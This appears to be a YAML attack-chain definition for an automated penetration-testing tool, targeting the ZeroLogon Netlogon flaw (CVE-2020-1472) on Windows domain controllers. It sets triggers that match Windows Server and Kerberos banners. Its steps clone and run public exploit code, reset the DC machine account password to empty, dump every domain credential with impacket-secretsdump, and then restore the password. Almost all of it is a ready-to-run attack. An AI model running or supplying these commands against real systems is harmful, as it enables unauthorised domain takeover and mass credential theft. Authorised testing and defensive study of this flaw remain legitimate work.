chain_id: zerologon_cve_2020_1472
title: "ZeroLogon — CVE-2020-1472 reset DC machine account password to empty"
severity: CRITICAL
tags: [ad, zerologon, cve-2020-1472, netlogon, dcsync, unauth]

trigger:
  any_of:
    - { product_pattern: "(?i)windows.*server.*(2008|2012|2016|2019)" }
    - { banner_pattern: "(?i)windows server (2008|2012|2016|2019)" }
    - { service_pattern: "(?i)kerberos" }

description: |
  Pre-auth Netlogon flaw on unpatched Windows DCs. A handful of crafted
  RPC calls with all-zero ClientCredential bytes succeed in 1/256 attempts
  to reset the DC's machine account password to empty. From there:
  DCSync, full domain compromise. Patch shipped August 2020 — expect
  this to land in older labs and air-gapped networks.

steps:
  - id: 1
    title: "Confirm vulnerability without modifying anything"
    command: |
      git clone https://github.com/SecuraBV/CVE-2020-1472.git
      cd CVE-2020-1472
      python3 zerologon_tester.py DC01 $DC

  - id: 2
    title: "If vulnerable — reset the DC$ password to empty"
    command: |
      git clone https://github.com/dirkjanm/CVE-2020-1472.git zerologon-attack
      cd zerologon-attack
      python3 cve-2020-1472-exploit.py DC01 $DC

  - id: 3
    title: "Use the now-empty machine account to DCSync"
    command: impacket-secretsdump -no-pass -just-dc $DOMAIN/'DC01$'@$DC

  - id: 4
    title: "RESTORE the original DC$ password (very important — do this last)"
    command: |
      # Without restore, AD becomes inconsistent and may break replication.
      python3 reinstall_original_pw.py DC01 $DC ORIGINAL_NT_HASH_FROM_SECRETSDUMP

references:
  - https://nvd.nist.gov/vuln/detail/CVE-2020-1472
  - https://github.com/SecuraBV/CVE-2020-1472
  - https://github.com/dirkjanm/CVE-2020-1472
